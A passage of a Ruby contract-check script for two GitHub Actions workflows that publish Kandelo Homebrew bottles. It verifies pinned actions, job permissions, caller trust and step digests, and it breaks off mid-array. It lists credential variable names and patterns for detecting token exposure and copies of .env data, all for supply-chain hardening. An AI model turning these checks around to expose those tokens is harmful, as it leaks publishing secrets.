#!/usr/bin/env ruby
# frozen_string_literal: true

require "digest"
require "json"
require "yaml"

REPO_ROOT = File.expand_path("..", __dir__)
PUBLISHER_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-publish.yml")
MAINTENANCE_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-maintenance.yml")
CHECKOUT_ACTION = "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd"
NIX_ACTION = "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25"
MAGIC_NIX_ACTION = "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d"
UPLOAD_ACTION = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"
DOWNLOAD_ACTION = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c"
BREW_COMMIT = "34c40c18ffa2029b611b61c73273e32c003d0842"
PUBLISHER_PLAN_DIGEST = "5724fbd09d7c43ba63c5bfa58cb4e73d7f0c08247b029b49a3e4e940d0011bd5"
PUBLISHER_BUILD_DIGEST = "7c4141acf50a353846fc87c9a8a9928efb5ba717e25793908f14c31b96045022"
PUBLISHER_UPLOAD_DIGEST = "60a32b6c315cfbaa5b4035c67f1cbb76d17b17a6e20c4f3e06d72aa66af456bd"
PUBLISHER_VERIFY_DIGEST = "8ec75a3dbdf3fc0df60672ef1d69d7a1e32beaa6e18cbeb91b513d289d95294c"
PUBLISHER_FINALIZE_DIGEST = "ff194b4abd44c058c18a1a9175b9be3f02814302a19b0f2842c3c86ad025ee04"
MAINTENANCE_VALIDATE_DIGEST = "9ab856fe40640172500d82b5179a096aa028763bf696aeac865d732298617a22"
MAINTENANCE_ROLLBACK_DIGEST = "45ff220697da9604dbe69c82761f285ba2e3e5182ef0819360128b82dd169efc"

def check(condition, message)
  raise message unless condition
end

def load_workflow(path)
  workflow = YAML.safe_load_file(path, aliases: false)
  check(workflow.is_a?(Hash), "#{File.basename(path)} is not a workflow mapping")
  workflow
end

def workflow_events(workflow)
  events = workflow.key?("on") ? workflow["on"] : workflow[true]
  check(events.is_a?(Hash), "workflow on: value is not a mapping")
  events
end

def values_for_key(node, wanted, values = [])
  case node
  when Hash
    node.each do |key, value|
      values << value if key.to_s == wanted
      values_for_key(value, wanted, values)
    end
  when Array
    node.each { |value| values_for_key(value, wanted, values) }
  end
  values
end

def deep_copy(value)
  Marshal.load(Marshal.dump(value))
end

def canonical_contract(value)
  case value
  when Hash
    value.keys.sort_by(&:to_s).to_h do |key|
      [key.to_s, canonical_contract(value.fetch(key))]
    end
  when Array
    value.map { |entry| canonical_contract(entry) }
  else
    value
  end
end

def contract_digest(value)
  Digest::SHA256.hexdigest(JSON.generate(canonical_contract(value)))
end

def workflow_jobs(workflow)
  jobs = workflow["jobs"]
  check(jobs.is_a?(Hash), "workflow jobs: value is not a mapping")
  jobs
end

def job_steps(job, label)
  steps = job["steps"]
  check(steps.is_a?(Array), "#{label} steps: value is not an array")
  check(steps.all? { |step| step.is_a?(Hash) }, "#{label} contains a non-mapping step")
  steps
end

def named_step(steps, name)
  matches = steps.select { |step| step["name"] == name }
  check(matches.length == 1, "expected exactly one #{name.inspect} step")
  matches.first
end

def exact_permissions?(actual, expected)
  actual.is_a?(Hash) && actual.transform_keys(&:to_s) == expected
end

def check_common(workflow, label)
  mutable_actions = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && !value.start_with?("./") &&
      !value.match?(%r{\A[^@\s]+@[0-9a-f]{40}\z})
  end
  check(mutable_actions.empty?,
        "#{label} executes mutable action refs: #{mutable_actions.join(', ')}")

  cache_uses = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && value.downcase.match?(%r{\Aactions/cache(?:/restore)?@})
  end
  check(cache_uses.empty?, "#{label} consumes Actions cache state: #{cache_uses.join(', ')}")

  unsafe_runs = values_for_key(workflow, "run").select do |value|
    value.is_a?(String) && value.include?("${{")
  end
  check(unsafe_runs.empty?, "#{label} interpolates a GitHub expression into shell syntax")
  check(values_for_key(workflow, "secrets").empty?, "#{label} passes repository secrets")
end

def check_publisher(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[concurrency jobs name on],
        "publisher has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle publish",
        "publisher name changed")
  check(workflow["concurrency"] == {
    "group" => "kandelo-homebrew-bottle-publish-${{ inputs.tap-repository }}-" \
               "${{ inputs.release-tag || github.run_id }}",
    "cancel-in-progress" => false,
  }, "publisher concurrency contract changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "publisher must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"], "publisher workflow_call contract changed")
  check(workflow_call["inputs"] == {
    "kandelo-repository" => { "type" => "string", "default" => "Automattic/kandelo" },
    "kandelo-ref" => { "type" => "string", "default" => "main" },
    "tap-repository" => { "type" => "string", "default" => "Automattic/kandelo-homebrew" },
    "tap-ref" => { "type" => "string", "default" => "main" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "bottle-root-url" => { "type" => "string", "default" => "" },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "dry-run" => { "type" => "boolean", "default" => false },
  }, "publisher inputs changed")
  check(!workflow.key?("permissions"), "publisher requests workflow-wide permissions")
  check_common(workflow, "reusable publisher")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[build-and-test finalize-tap plan upload-bottle verify-bottle],
        "publisher has an unexpected job set")
  plan = jobs.fetch("plan")
  build = jobs.fetch("build-and-test")
  upload = jobs.fetch("upload-bottle")
  verify = jobs.fetch("verify-bottle")
  finalize = jobs.fetch("finalize-tap")

  check(plan.keys.sort == %w[outputs permissions runs-on steps],
        "publisher plan contract changed")
  %w[build-and-test upload-bottle verify-bottle finalize-tap].each do |job_name|
    check(jobs.fetch(job_name).keys.sort ==
          %w[if needs permissions runs-on steps strategy timeout-minutes],
          "publisher #{job_name} job contract changed")
  end
  check(plan["runs-on"] == "ubuntu-latest" &&
        exact_permissions?(plan["permissions"], { "contents" => "read" }),
        "publisher plan authority changed")
  check(build["runs-on"] == "ubuntu-latest" && build["timeout-minutes"] == 1440 &&
        exact_permissions?(build["permissions"], { "contents" => "read", "actions" => "read" }),
        "publisher build authority changed")
  check(upload["runs-on"] == "ubuntu-latest" && upload["timeout-minutes"] == 60 &&
        exact_permissions?(upload["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }), "publisher uploader authority changed")
  check(verify["runs-on"] == "ubuntu-latest" && verify["timeout-minutes"] == 1440 &&
        exact_permissions?(verify["permissions"], { "actions" => "read", "contents" => "read" }),
        "publisher verifier authority changed")
  check(finalize["runs-on"] == "ubuntu-latest" && finalize["timeout-minutes"] == 120 &&
        exact_permissions?(finalize["permissions"], { "actions" => "read", "contents" => "write" }),
        "publisher finalizer authority changed")

  matrix_strategy = {
    "fail-fast" => false,
    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.matrix) }}" },
  }
  [build, upload, verify, finalize].each do |job|
    check(job["strategy"] == matrix_strategy,
          "publisher execution job bypasses the validated matrix")
  end
  check(build["needs"] == ["plan"] &&
        build["if"] == "${{ needs.plan.outputs.matrix != '[]' }}",
        "publisher build graph changed")
  check(upload["needs"] == %w[plan build-and-test] &&
        upload["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
                         "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' }}",
        "publisher upload graph or dry-run isolation changed")
  check(verify["needs"] == %w[plan build-and-test upload-bottle] &&
        verify["if"] == "${{ always() && !cancelled() && needs.plan.result == 'success' && " \
                         "needs.plan.outputs.matrix != '[]' }}",
        "publisher verification graph changed")
  check(finalize["needs"] == %w[plan build-and-test upload-bottle verify-bottle] &&
        finalize["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
                           "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' }}",
        "publisher finalization graph or dry-run isolation changed")

  plan_steps = job_steps(plan, "publisher plan")
  build_steps = job_steps(build, "publisher build")
  upload_steps = job_steps(upload, "publisher upload")
  verify_steps = job_steps(verify, "publisher verification")
  finalize_steps = job_steps(finalize, "publisher finalization")

  validation = named_step(plan_steps, "Validate caller trust boundary")
  check(plan_steps.first.equal?(validation), "publisher trust validation must be first")
  check(validation.keys.sort == %w[env name run shell] && validation["shell"] == "bash" &&
        validation["env"] == {
          "CALLER_EVENT_NAME" => "${{ github.event_name }}",
          "CALLER_REF" => "${{ github.ref }}",
          "CALLER_REPOSITORY" => "${{ github.repository }}",
          "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
          "DRY_RUN" => "${{ inputs.dry-run }}",
          "KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
          "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
          "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "TAP_REF" => "${{ inputs.tap-ref }}",
          "BOTTLE_ROOT_URL" => "${{ inputs.bottle-root-url }}",
        }, "publisher caller validation mapping changed")
  validation_run = validation.fetch("run")
  [
    '[ "$CALLER_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
    '[ "$CALLER_REF" = "refs/heads/main" ]',
    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
    "dry-run-bottles.yml@refs/heads/main",
    "publish-bottles.yml@refs/heads/main",
    "maintain-bottles.yml@refs/heads/main",
    '[ "$KANDELO_REPOSITORY" = "Automattic/kandelo" ]',
    '[ "$KANDELO_REF" = "main" ]',
    '[ "$TAP_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
    '[ "$TAP_REF" = "main" ]',
    '[ -z "$BOTTLE_ROOT_URL" ]',
  ].each do |predicate|
    check(validation_run.include?(predicate), "publisher caller validation lacks #{predicate}")
  end
  dry_index = validation_run.index('if [ "$DRY_RUN" = "true" ]')
  caller_index = validation_run.index('[ "$CALLER_REF" = "refs/heads/main" ]')
  check(dry_index && caller_index && caller_index < dry_index,
        "publisher dry-run can bypass caller authority validation")

  release_run = named_step(plan_steps, "Resolve release and bottle root").fetch("run")
  check(release_run.include?('expected_release_tag="bottles-abi-v${abi}"') &&
        release_run.include?('[ "$release_tag" != "$expected_release_tag" ]'),
        "publisher does not bind release tag exactly to the resolved ABI")
  check(plan["outputs"] == {
    "matrix" => "${{ steps.matrix.outputs.matrix }}",
    "abi" => "${{ steps.release.outputs.abi }}",
    "release-tag" => "${{ steps.release.outputs.release-tag }}",
    "bottle-root-prefix" => "${{ steps.release.outputs.bottle-root-prefix }}",
    "kandelo-sha" => "${{ steps.source-commits.outputs.kandelo-sha }}",
    "tap-sha" => "${{ steps.source-commits.outputs.tap-sha }}",
  }, "publisher plan outputs changed")

  expected_uses = [
    *Array.new(13, CHECKOUT_ACTION),
    *Array.new(4, NIX_ACTION),
    *Array.new(2, MAGIC_NIX_ACTION),
    *Array.new(5, UPLOAD_ACTION),
    *Array.new(4, DOWNLOAD_ACTION),
  ].sort
  check(values_for_key(workflow, "uses").sort == expected_uses,
        "publisher action set or pin changed")

  checkout_view = lambda do |steps|
    steps.select { |step| step["uses"] == CHECKOUT_ACTION }.map do |step|
      { "name" => step["name"], "if" => step["if"], "with" => step["with"] }
    end
  end
  check(checkout_view.call(plan_steps) == [
    {
      "name" => "Checkout Kandelo workflow source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ inputs.kandelo-ref }}", "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout tap", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ inputs.tap-ref }}", "path" => "tap",
      },
    },
  ], "publisher plan checkout wiring changed")
  check(checkout_view.call(build_steps) == [
    {
      "name" => "Checkout Kandelo workflow source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout tap", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
      },
    },
    {
      "name" => "Checkout reviewed Homebrew implementation", "if" => nil,
      "with" => {
        "persist-credentials" => false, "repository" => "Homebrew/brew",
        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
      },
    },
  ], "publisher build checkout wiring changed")
  check(checkout_view.call(upload_steps) == [
    {
      "name" => "Checkout exact Kandelo validator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
  ], "publisher uploader checkout wiring changed")
  check(checkout_view.call(verify_steps) == [
    {
      "name" => "Checkout exact Kandelo verifier source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
      },
    },
    {
      "name" => "Checkout reviewed Homebrew implementation", "if" => nil,
      "with" => {
        "persist-credentials" => false, "repository" => "Homebrew/brew",
        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
      },
    },
  ], "publisher verifier checkout wiring changed")

  failure_condition = "${{ always() && (steps.publish-handoff.outcome != 'success' || " \
                      "steps.validate-payload.outcome != 'success' || steps.publish.outcome != 'success') }}"
  check(checkout_view.call(finalize_steps) == [
    {
      "name" => "Checkout exact Kandelo finalizer source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact base tap without credentials", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-base",
      },
    },
    {
      "name" => "Checkout tap publication branch after payload validation",
      "if" => "${{ steps.validate-payload.outcome == 'success' }}",
      "with" => {
        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
        "path" => "tap-publish", "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout clean tap for a failed-attempt report", "if" => failure_condition,
      "with" => {
        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
        "path" => "tap-report", "fetch-depth" => 0,
      },
    },
  ], "publisher finalizer checkout wiring changed")

  credential_names = %w[
    GH_TOKEN GITHUB_TOKEN HOMEBREW_GITHUB_API_TOKEN HOMEBREW_GITHUB_PACKAGES_TOKEN
    HOMEBREW_DOCKER_REGISTRY_TOKEN
  ]
  [build_steps, verify_steps].each do |steps|
    exposed = steps.flat_map { |step| step.fetch("env", {}).keys & credential_names }
    check(exposed.empty?, "unprivileged publisher phase exposes a credential environment")
    check(steps.select { |step| step["uses"] == CHECKOUT_ACTION }.all? do |step|
      step.dig("with", "persist-credentials") == false
    end, "unprivileged publisher phase persists checkout credentials")
  end
  uploader_credential_steps = upload_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(uploader_credential_steps.map { |step| step["name"] } ==
        ["Upload validated bottle in isolated ORAS auth state"] &&
        uploader_credential_steps.first["env"] == { "GH_TOKEN" => "${{ github.token }}" },
        "publisher uploader credentials escape the isolated upload step")
  finalizer_credential_steps = finalize_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(finalizer_credential_steps.map { |step| step["name"] } == [
    "Publish validated sidecars under the tap state lock",
    "Record failed attempt without replacing last-green metadata",
  ] && finalizer_credential_steps.all? do |step|
    step.fetch("env").slice(*credential_names) == { "GH_TOKEN" => "${{ github.token }}" }
  end, "publisher finalizer credentials escape tap write steps")

  build_handoff_name =
    "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  upload_receipt_name =
    "homebrew-upload-receipt-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  publish_handoff_name =
    "homebrew-publish-handoff-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  build_handoff_upload = named_step(build_steps, "Upload strict bottle build handoff")
  check(build_handoff_upload["uses"] == UPLOAD_ACTION && build_handoff_upload["with"] == {
    "name" => build_handoff_name,
    "path" => "${{ runner.temp }}/homebrew-build-handoff",
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher build handoff artifact contract changed")
  upload_handoff_download = named_step(upload_steps, "Download strict build handoff")
  verify_handoff_download = named_step(verify_steps, "Download strict build handoff")
  [upload_handoff_download, verify_handoff_download].each do |step|
    check(step["uses"] == DOWNLOAD_ACTION && step["id"] == "build-handoff" &&
          step["continue-on-error"] == true && step["with"] == {
            "name" => build_handoff_name,
            "path" => "${{ runner.temp }}/homebrew-build-handoff",
          }, "publisher build handoff download contract changed")
  end
  receipt_upload = named_step(upload_steps, "Upload strict upload receipt")
  check(receipt_upload["uses"] == UPLOAD_ACTION && receipt_upload["with"] == {
    "name" => upload_receipt_name,
    "path" => "${{ runner.temp }}/homebrew-upload-receipt/receipt.json",
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher upload receipt artifact contract changed")
  receipt_download = named_step(verify_steps, "Download strict upload receipt")
  check(receipt_download["uses"] == DOWNLOAD_ACTION && receipt_download["id"] == "upload-receipt" &&
        receipt_download["if"] == "${{ !inputs.dry-run }}" &&
        receipt_download["continue-on-error"] == true && receipt_download["with"] == {
          "name" => upload_receipt_name,
          "path" => "${{ runner.temp }}/homebrew-upload-receipt",
        }, "publisher receipt download contract changed")
  publish_handoff_upload = named_step(verify_steps, "Upload validated publication handoff")
  check(publish_handoff_upload["uses"] == UPLOAD_ACTION && publish_handoff_upload["with"] == {
    "name" => publish_handoff_name,
    "path" => "${{ runner.temp }}/homebrew-publish-handoff",
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher publication handoff artifact contract changed")
  publish_handoff_download = named_step(finalize_steps, "Download validated publication handoff")
  check(publish_handoff_download["uses"] == DOWNLOAD_ACTION &&
        publish_handoff_download["id"] == "publish-handoff" &&
        publish_handoff_download["continue-on-error"] == true &&
        publish_handoff_download["with"] == {
          "name" => publish_handoff_name,
          "path" => "${{ runner.temp }}/homebrew-publish-handoff",
        }, "publisher publication handoff download contract changed")

  build_run = named_step(build_steps,
                         "Build and test Homebrew bottle without publisher credentials").fetch("run")
  check(build_run.include?("unprivileged bottle build received $secret_name") &&
        build_run.include?("scripts/homebrew-bottle-build.sh"),
        "publisher build phase no longer rejects credentials or uses the reviewed builder")
  create_handoff_run = named_step(build_steps, "Create strict bottle data handoff").fetch("run")
  [
    "scripts/homebrew-create-build-handoff.sh", '--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"',
    '--bottle "$BOTTLE_ARCHIVE"', '--bottle-json "$BOTTLE_JSON"',
    '--out "$RUNNER_TEMP/homebrew-build-handoff"',
  ].each do |fragment|
    check(create_handoff_run.include?(fragment), "publisher build handoff lacks #{fragment}")
  end

  upload_validate = named_step(upload_steps,
                               "Validate build data before exposing upload credentials")
  upload_attempt = named_step(upload_steps, "Upload validated bottle in isolated ORAS auth state")
  check(upload_validate["id"] == "validate-build" &&
        upload_attempt["if"] == "${{ steps.validate-build.outcome == 'success' }}" &&
        upload_steps.index(upload_validate) < upload_steps.index(upload_attempt),
        "publisher exposes upload credentials before validating the handoff")
  check(upload_validate.fetch("run").include?("scripts/homebrew-validate-build-handoff.sh") &&
        upload_validate.fetch("run").include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
        upload_attempt.fetch("run").include?("scripts/homebrew-ghcr-upload.sh") &&
        upload_attempt.fetch("run").include?('--out-json "$RUNNER_TEMP/homebrew-upload-receipt/receipt.json"'),
        "publisher isolated upload path changed")
  check(upload_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") } &&
        upload_steps.count { |step| step["uses"] == UPLOAD_ACTION } == 1,
        "credentialed uploader publishes diagnostics")

  canonical_build = named_step(verify_steps,
                               "Validate build handoff and reconstruct canonical bottle JSON").fetch("run")
  canonical_receipt = named_step(verify_steps,
                                 "Validate receipt against exact bottle bytes").fetch("run")
  [canonical_build, canonical_receipt].each do |run|
    check(run.include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
          run.include?('--out-bottle-json "$RUNNER_TEMP/homebrew-verified-input/bottle.json"'),
          "publisher does not reconstruct canonical bottle JSON")
  end
  merge_run = named_step(verify_steps,
                         "Merge only reconstructed bottle metadata into the fresh tap").fetch("run")
  [
    "scripts/homebrew-merge-bottle-json.sh", '--bottle-json "$BOTTLE_JSON"',
    '--expected-sha256 "$BOTTLE_SHA256"', '--expected-root-url "$BOTTLE_ROOT_URL"',
    'merged_tap="$RUNNER_TEMP/homebrew-merged-tap"',
    'cp -a "$GITHUB_WORKSPACE/tap" "$merged_tap"',
    '[ "$changed" = "Formula/$FORMULA.rb" ]',
    'bottle merge modified the archived source tap',
  ].each do |fragment|
    check(merge_run.include?(fragment), "publisher canonical bottle merge lacks #{fragment}")
  end

  anonymous_run = named_step(verify_steps,
                             "Select exact anonymous bottle bytes for runtime validation").fetch("run")
  [
    "scripts/homebrew-verify-public-bottle.ts", '--url "$BOTTLE_URL"',
    '--sha256 "$BOTTLE_SHA256"', '--bytes "$BOTTLE_BYTES"', '--out "$runtime_bottle"',
    'actual_sha="$(sha256sum "$runtime_bottle"',
  ].each do |fragment|
    check(anonymous_run.include?(fragment), "publisher anonymous bottle readback lacks #{fragment}")
  end
  check((credential_names & anonymous_run.scan(/[A-Z][A-Z0-9_]+/)).empty?,
        "publisher anonymous bottle readback references a credential")
  full_fetch_run = named_step(verify_steps,
                              "Fetch the complete ABI browser runtime graph").fetch("run")
  check(full_fetch_run.include?("bash scripts/dev-shell.sh bash scripts/fetch-binaries.sh --fetch-only"),
        "publisher browser verification does not fetch the complete ABI runtime graph")
  sidecar_run = named_step(verify_steps,
                           "Generate sidecars from the selected bottle").fetch("run")
  check(sidecar_run.include?('KANDELO_HOMEBREW_BOTTLE_ARCHIVE="$RUNTIME_BOTTLE"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_TAP_ROOT="$RUNNER_TEMP/homebrew-merged-tap"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_FORMULA_SOURCE_ROOT="$GITHUB_WORKSPACE/tap"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_BOTTLE_JSON="$RUNNER_TEMP/homebrew-build-handoff/bottle.json"') &&
        sidecar_run.include?("scripts/homebrew-generate-sidecars-from-env.sh"),
        "publisher sidecars do not use archived Formula facts and the anonymously selected bottle")
  browser_run = named_step(verify_steps,
                           "Build and strictly smoke the hello browser image").fetch("run")
  [
    "bash scripts/dev-shell.sh bash -c", "KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=1",
    "--reporter=json", ".stats.expected == 1", ".stats.unexpected == 0",
    ".stats.flaky == 0", ".stats.skipped == 0",
  ].each do |fragment|
    check(browser_run.include?(fragment), "publisher strict browser smoke lacks #{fragment}")
  end

  package_handoff_run = named_step(verify_steps,
                                   "Package validated data-only publication handoff").fetch("run")
  [
    'mkdir -p "$publish_handoff/build" "$publish_handoff/composition"',
    'homebrew-build-handoff/manifest.json', 'homebrew-build-handoff/bottle.json',
    'cp "$RUNTIME_BOTTLE" "$publish_handoff/build/bottle.tar.gz"', "receipt.json",
    'homebrew-sidecars/sidecars-input.json',
    '.packages[0].bottles[0].bottle_file = "../build/bottle.tar.gz"',
    "scripts/homebrew-validate-publish-handoff.sh",
  ].each do |fragment|
    check(package_handoff_run.include?(fragment), "publisher publication handoff lacks #{fragment}")
  end
  check(!package_handoff_run.include?("sidecars/Formula") &&
        !package_handoff_run.include?("sidecars/Kandelo"),
        "publisher publication handoff carries stale precomputed tap state")
  check(!package_handoff_run.match?(/(?:^|\s)(?:cp|rsync)[^\n]*(?:scripts?|\.env)(?:\s|\/|$)/),
        "publisher publication handoff includes executable or environment data")

  payload_validation = named_step(finalize_steps,
                                  "Validate the complete data-only publication payload")
  publish_checkout = named_step(finalize_steps,
                                "Checkout tap publication branch after payload validation")
  check(payload_validation["id"] == "validate-payload" &&
        payload_validation["continue-on-error"] == true &&
        payload_validation.fetch("run").include?("scripts/homebrew-validate-publish-handoff.sh") &&
        finalize_steps.index(payload_validation) < finalize_steps.index(publish_checkout),
        "publisher finalizer does not validate the strict handoff before credentialed checkout")
  publish_step = named_step(finalize_steps, "Publish validated sidecars under the tap state lock")
  publish_run = publish_step.fetch("run")
  check(publish_run.include?("scripts/homebrew-publish-sidecars.sh") &&
        publish_run.include?('--publication-handoff "$RUNNER_TEMP/homebrew-publish-handoff"') &&
        !publish_run.include?("--sidecar-root"),
        "publisher finalizer bypasses under-lock package composition")
  check(!finalize_steps.filter_map { |step| step["run"] }.join("\n").match?(/(?:^|\s)brew(?:\s|$)/) &&
        !finalize_steps.filter_map { |step| step["run"] }.join("\n").include?(
          "homebrew-generate-sidecars-from-env.sh"
        ), "credentialed finalizer evaluates Homebrew or Formula code")
  check(finalize_steps.none? { |step| step["uses"] == UPLOAD_ACTION } &&
        finalize_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") },
        "credentialed finalizer publishes diagnostics")

  report_checkout = named_step(finalize_steps,
                               "Checkout clean tap for a failed-attempt report")
  report = named_step(finalize_steps,
                      "Record failed attempt without replacing last-green metadata")
  final_fail = named_step(finalize_steps, "Fail after reporting an unsuccessful matrix entry")
  check(report_checkout["if"] == failure_condition && report["if"] == failure_condition &&
        final_fail["if"] == failure_condition,
        "publisher failed-attempt path changed")
  report_run = report.fetch("run")
  check(report_run.include?('--tap-root "$GITHUB_WORKSPACE/tap-report"') &&
        !report_run.include?("tap-publish") && !report_run.include?("homebrew-finalize-error.txt") &&
        report_run.include?('error_text="publish-handoff=$PUBLISH_HANDOFF_OUTCOME; '),
        "publisher failure report does not use a clean checkout and sanitized outcomes")

  check(!values_for_key(workflow, "run").join("\n").include?("GITHUB_SHA"),
        "publisher uses caller-context SHA as source provenance")
  check(contract_digest(plan_steps) == PUBLISHER_PLAN_DIGEST,
        "publisher plan step contract changed")
  check(contract_digest(build_steps) == PUBLISHER_BUILD_DIGEST,
        "publisher build step contract changed")
  check(contract_digest(upload_steps) == PUBLISHER_UPLOAD_DIGEST,
        "publisher upload step contract changed")
  check(contract_digest(verify_steps) == PUBLISHER_VERIFY_DIGEST,
        "publisher verification step contract changed")
  check(contract_digest(finalize_steps) == PUBLISHER_FINALIZE_DIGEST,
        "publisher finalization step contract changed")
end

def check_maintenance(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[concurrency jobs name on],
        "maintenance has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle maintenance",
        "maintenance name changed")
  check(workflow["concurrency"] == {
    "group" => "kandelo-homebrew-bottle-maintenance-Automattic-kandelo-homebrew-" \
               "${{ inputs.release-tag || github.run_id }}",
    "cancel-in-progress" => false,
  }, "maintenance concurrency contract changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "maintenance must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"], "maintenance workflow_call contract changed")
  check(workflow_call["inputs"] == {
    "mode" => { "type" => "string", "default" => "rebuild" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "rollback-reason" => { "type" => "string", "default" => "" },
    "rollback-ref" => { "type" => "string", "default" => "" },
    "deleted-package-url" => { "type" => "string", "default" => "" },
    "deletion-reason" => { "type" => "string", "default" => "" },
  }, "maintenance inputs changed")
  check(!workflow.key?("permissions"), "maintenance requests workflow permissions")
  check_common(workflow, "maintenance workflow")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[rebuild rollback validate], "maintenance has an unexpected job set")
  validate = jobs.fetch("validate")
  rebuild = jobs.fetch("rebuild")
  rollback = jobs.fetch("rollback")
  check(validate.keys.sort == %w[permissions runs-on steps],
        "maintenance validation job changed")
  check(validate["runs-on"] == "ubuntu-latest" && validate["permissions"] == {},
        "maintenance validation authority changed")
  validate_steps = job_steps(validate, "maintenance validate")
  check(contract_digest(validate_steps) == MAINTENANCE_VALIDATE_DIGEST,
        "maintenance validation step contract changed")
  validate_step = named_step(validate_steps, "Validate maintenance mode")
  check(validate_step["env"] == {
    "CALLER_EVENT_NAME" => "${{ github.event_name }}",
    "CALLER_REF" => "${{ github.ref }}",
    "CALLER_REPOSITORY" => "${{ github.repository }}",
    "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
    "MODE" => "${{ inputs.mode }}",
  }, "maintenance caller validation mapping changed")
  validate_run = validate_step.fetch("run")
  [
